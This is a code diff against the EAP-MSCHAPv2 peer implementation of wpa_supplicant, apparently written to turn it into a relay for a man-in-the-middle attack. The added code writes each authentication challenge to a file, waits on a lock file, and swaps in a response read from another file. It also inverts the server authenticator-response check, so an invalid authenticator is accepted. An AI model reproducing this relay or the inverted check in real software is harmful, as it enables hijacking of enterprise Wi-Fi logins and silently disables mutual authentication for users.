@@ -219,6 +219,57 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 	wpabuf_put_data(resp, identity, identity_len);
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: TX identifier %d mschapv2_id %d "
 		   "(response)", id, ms->mschapv2_id);
+
+	
+	// MICHAEL WAS HERE
+	// Read response from file.
+
+	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : RESPONSE SET BY PEER",
+		resp->buf, resp->used);
+
+	// Waiting for response (Bull spinlock)
+	char* inLockName = "RESPONSE_LOCK";
+	FILE* inLock = fopen(inLockName, "rb");
+	u8 lockvar [1];
+
+	if( inLock == NULL )
+		printf("Open Error Lock");
+	
+	while(fread(lockvar,1,1,inLock) < 1 ){
+		usleep(10000);
+	}
+	fclose(inLock);
+	inLock = fopen(inLockName, "wb");
+	fclose(inLock);
+	// Yay response
+
+	char* inFileName = "RESPONSE_FILE.txt";
+	FILE* inFile = fopen(inFileName, "rb");	
+	u8 line [resp->used]; 
+
+	if( inFile == NULL )
+		printf("Open Error File");
+
+	fread(line, resp->used, 1, inFile);
+
+	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : AUTH RESPONSE CONTENTS",
+		resp->buf, resp->used);
+	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : LINE CONTENTS",
+		line, resp->used);
+
+	memcpy(resp->buf, line, resp->used);
+
+	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : AUTH RESPONSE CONTENTS (AFTER MODIFY)",
+		resp->buf, resp->used);
+
+	fclose(inFile);
+
+	// Clean File
+	inFile = fopen(inFileName, "wb");
+	fclose(inFile);
+
+	// MICHAEL STOPED HERE
+
 	return resp;
 }
 
@@ -287,6 +338,39 @@ static struct wpabuf * eap_mschapv2_challenge(
 	ret->decision = DECISION_FAIL;
 	ret->allowNotifications = TRUE;
 
+	// MICHAEL WAS HERE
+	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : CHALLANGE DATA", challenge, MSCHAPV2_KEY_LEN);
+
+	char* outFileName = "CHALLENGE_FILE.txt";
+	FILE* outFile = fopen(outFileName, "wb");
+
+	if( outFile == NULL )
+	{
+		printf("Open Error");
+	}
+
+	fwrite(challenge,16,1,outFile); 
+	
+	wpa_hexdump(MSG_INFO, "RELAY SUPLICANT : CHALLANGE DATA WRITTEN", challenge, MSCHAPV2_KEY_LEN);
+
+	fclose(outFile);
+
+	// Inform of our readyness
+	char* outLockName = "CHALLENGE_LOCK";
+	FILE* outLock = fopen(outLockName, "wb");
+
+	u8 theSignal [1] = "A";
+
+	if( outLock == NULL )
+		printf("Open Error Lock");
+	
+	fwrite(theSignal,1,1,outLock);
+	fclose(outLock);
+	// OK GO!
+
+	// MICHAEL STOPPED HERE
+	
+
 	return eap_mschapv2_challenge_reply(sm, data, id, req->mschapv2_id,
 					    challenge);
 }
@@ -352,8 +436,12 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Received success");
 	len = req_len - sizeof(*req);
 	pos = (const u8 *) (req + 1);
+	// MICHAEL WAS HERE
+	if (mschapv2_verify_auth_response(data->auth_response, pos, len))
+		wpa_printf(MSG_INFO,"INVALID AUTHRESPONSE MYDUDE");
+	// MICHAEL STOPPED HERE
 	if (!data->auth_response_valid ||
-	    mschapv2_verify_auth_response(data->auth_response, pos, len)) {
+	    !mschapv2_verify_auth_response(data->auth_response, pos, len)) {
 		wpa_printf(MSG_WARNING, "EAP-MSCHAPV2: Invalid authenticator "
 			   "response in success request");
 		ret->methodState = METHOD_DONE;
